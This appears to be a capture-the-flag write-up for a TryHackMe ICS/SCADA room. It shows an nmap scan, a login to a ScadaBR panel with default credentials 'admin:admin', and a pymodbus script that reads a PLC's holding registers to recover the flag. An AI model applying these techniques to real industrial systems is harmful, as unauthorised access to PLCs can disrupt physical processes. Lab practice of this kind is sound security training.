---
title: "TryHackMe - Brr"
date: 2026-07-17 20:00:00 -0400
categories: [Writeups, ICS-SCADA]
tags: [tryhackme, modbus, scada, scadabr, pymodbus, ics]
toc: true
---

## Context

An industrial-systems themed TryHackMe room. The hint sets the tone:

> *The cold never lies, but the SCADA panel guarding it just handed you the keys. Chase the chill all the way down.*

Three things hide in there:

- **SCADA panel**: we're not looking for a classic web server but an industrial supervision interface.
- **handed you the keys**: the panel exposes access without proper authentication (default credentials).
- **chase the chill all the way down**: we need to dig past the interface, down to the device behind it.

Expected flag format: `***{******_***}`.

## Reconnaissance

Full port scan with service detection:

```bash
nmap -sV -sC -p- -T4 <IP>
```

Useful results:

| Port | Service | Note |
|------|---------|------|
| 22 | OpenSSH 9.6 | no access without creds |
| 80 | WebSockify | noVNC wrapper |
| 5020 | *unknown* | worth watching |
| 5901 | VNC | remote desktop |
| 8080 | Apache Tomcat -> **ScadaBR CTF** | the SCADA panel |

The HTTP title on port 8080 confirms the hint: **ScadaBR**, an open-source supervision (HMI) solution running on Tomcat.

## Accessing the ScadaBR panel

ScadaBR is known for its default credentials. First try on the login page:

```
admin:admin
```

Logged in. Those are the *keys* from the hint.

In the interface, a **data point** named `secret - test` stands out. Added to the watch list, it refuses to report a value:

> The point or its data source may be disabled.

## Descending to the PLC

The associated data source was disabled. Going to the data sources page (`data_sources.shtm`) reveals its configuration:

| Field | Value |
|-------|-------|
| Name | secret |
| Type | Modbus IP |
| Connection | `plc:5020` |
| Slave id | 1 |

The mysterious port 5020 from the initial scan was **Modbus/TCP** to a PLC. The ScadaBR panel was only a reading window; the data lives in the PLC.

Rather than clicking register by register in the interface, I query the PLC directly with `pymodbus`.

## Reading the Modbus registers

Modbus exposes four distinct areas: coils, discrete inputs, input registers and holding registers. Each has its own address space, so all of them need scanning.

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('<IP>', port=5020)
c.connect()

def scan(reader, label):
    for start in range(0, 500, 50):
        rr = reader(start, count=50)
        if rr.isError():
            print(f"[{label}] {start}: ERROR {rr}")
        else:
            nz = [(start+i, v) for i, v in enumerate(rr.registers) if v != 0]
            print(f"[{label}] {start}: {nz if nz else 'none'}")

scan(c.read_input_registers, "input")
scan(c.read_holding_registers, "holding")
c.close()
```

The **input registers** respond but are empty (all 0). The **holding registers** at offset 0 deliver the goods:

```
[holding] 0: [(0,84),(1,72),(2,77),(3,123),(4,109),(5,111),(6,100),(7,98),(8,117),(9,115),(10,95),(11,104),(12,105),(13,100),(14,125)]
```

## Decoding

These values are all in the 32-126 range: printable ASCII, one character per register.

```python
regs = [84,72,77,123,109,111,100,98,117,115,95,104,105,100,125]
print(''.join(chr(x) for x in regs))
```


## Takeaways

- **A client's config tells you about the target, not what it exposes.** ScadaBR read the *input registers* (empty) while the data sat in the *holding registers*. Trusting the existing configuration would have missed the flag entirely: enumerate all four Modbus areas yourself.
- **Modbus reads are atomic.** A single non-existent address in the requested range makes the PLC reject the whole request (*Illegal Data Address*). Scan in small blocks rather than one wide sweep.
- **Defensive note.** Everything hinged on `admin:admin` on the HMI. Once inside a supervision panel, an attacker can reach the PLC behind it and read (or write) its registers directly. On real ICS, that write path is the dangerous part.

## Tools

`nmap`, `pymodbus`, ScadaBR (`admin:admin`).
